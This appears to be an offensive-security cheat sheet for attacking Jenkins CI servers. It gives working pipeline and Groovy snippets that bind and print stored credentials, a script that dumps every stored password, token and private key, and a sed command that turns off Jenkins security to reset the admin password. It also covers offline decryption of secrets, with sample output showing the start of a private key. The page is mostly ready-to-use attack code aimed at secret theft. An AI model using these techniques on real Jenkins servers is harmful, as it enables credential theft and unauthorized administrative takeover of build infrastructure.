# Jenkins

### Extract secrets from credential store <a href="#extract-secrets-from-credential-store" id="extract-secrets-from-credential-store"></a>

Need to **know the name and type of the secret**.

Copy

```javascript
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
    sh '''
        env #Search for USERNAME and PASS
    '''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
    sh '''
        env #Search for SECRET
    '''                 
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
    sh '''
        env # Search for USERPASS
    '''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                 string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
     sh '''
        env
    '''
}
```

**All the credential types**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

### Abuse agent admin privilege <a href="#abuse-agent-admin-privilege" id="abuse-agent-admin-privilege"></a>

![](https://smth.s4ar.ru/\~gitbook/image?url=https%3A%2F%2F2470360045-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTPpVTpZ2AVoWJgs2n5qA%252Fuploads%252FPyBVZ0tdzM6xU9x8Kk05%252Fimage.png%3Falt%3Dmedia%26token%3D0098a704-547e-4b17-b707-9862c94effbf\&width=768\&dpr=4\&quality=100\&sign=ccdcf0\&sv=1)

You can steal credentials (not key), via create controlled jenkins agent

![](https://smth.s4ar.ru/\~gitbook/image?url=https%3A%2F%2F2470360045-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTPpVTpZ2AVoWJgs2n5qA%252Fuploads%252F9VYiwAsRzYPYRH1cISJ3%252Fimage.png%3Falt%3Dmedia%26token%3D4f1b8cbb-5fc8-40ec-bbed-5fcf0f1fceb4\&width=768\&dpr=4\&quality=100\&sign=57e97dc\&sv=1)

Configure [ssh\_mitm](https://miloserdov.org/?p=3699).

### Start job on master node <a href="#start-job-on-master-node" id="start-job-on-master-node"></a>

Copy

```javascript
pipeline {
    agent {label 'built-in'} #try add this
    environment {
        PROJECT = "sanic"
    }

    stages {
        stage ('Install_Requirements') {
            steps {
                sh 'pip -r  install requirements'
            }
        }
    }

    post { 
        always { 
            cleanWs()
        }
    }
}
```

### Dump secrets from credentials Groovy <a href="#dump-secrets-from-credentials-groovy" id="dump-secrets-from-credentials-groovy"></a>

Copy

```groovy
import java.nio.charset.StandardCharsets;
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
      com.cloudbees.plugins.credentials.Credentials.class
)

for (c in creds) {
  println(c.id)
  if (c.properties.description) {
    println("   description: " + c.description)
  }
  if (c.properties.username) {
    println("   username: " + c.username)
  }
  if (c.properties.password) {
    println("   password: " + c.password)
  }
  if (c.properties.passphrase) {
    println("   passphrase: " + c.passphrase)
  }
  if (c.properties.secret) {
    println("   secret: " + c.secret)
  }
  if (c.properties.secretBytes) {
    println("    secretBytes: ")
    println("\n" + new String(c.secretBytes.getPlainData(), StandardCharsets.UTF_8))
    println("")
  }
  if (c.properties.privateKeySource) {
    println("   privateKey: " + c.getPrivateKey())
  }
  if (c.properties.apiToken) {
    println("   apiToken: " + c.apiToken)
  }
  if (c.properties.token) {
    println("   token: " + c.token)
  }
  println("")
}
```

### Create new admin user <a href="#create-new-admin-user" id="create-new-admin-user"></a>

1. Access the Jenkins config.xml file in `/var/lib/jenkins/config.xml` or `C:\Program Files (x86)\Jenkis\`
2. Search for the word `<useSecurity>true</useSecurity>`and change the word \*\*`true` \*\* to **`false`**.
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Restart** the **Jenkins** server: `service jenkins restart`
4. Now go to the Jenkins portal again and **Jenkins will not ask any credentials** this time. You navigate to "**Manage Jenkins**" to set the **administrator password again**.
5. **Enable** the **security** again by changing settings to `<useSecurity>true</useSecurity>` and **restart the Jenkins again**.

### **Decrypt Jenkins secrets offline** <a href="#decrypt-jenkins-secrets-offline" id="decrypt-jenkins-secrets-offline"></a>

If you have dumped the **needed passwords to decrypt the secrets**, use [**this script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **to decrypt those secrets**. Also need `secrets/master.key` or `secrets/hudson.util.Secret`

Copy

```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
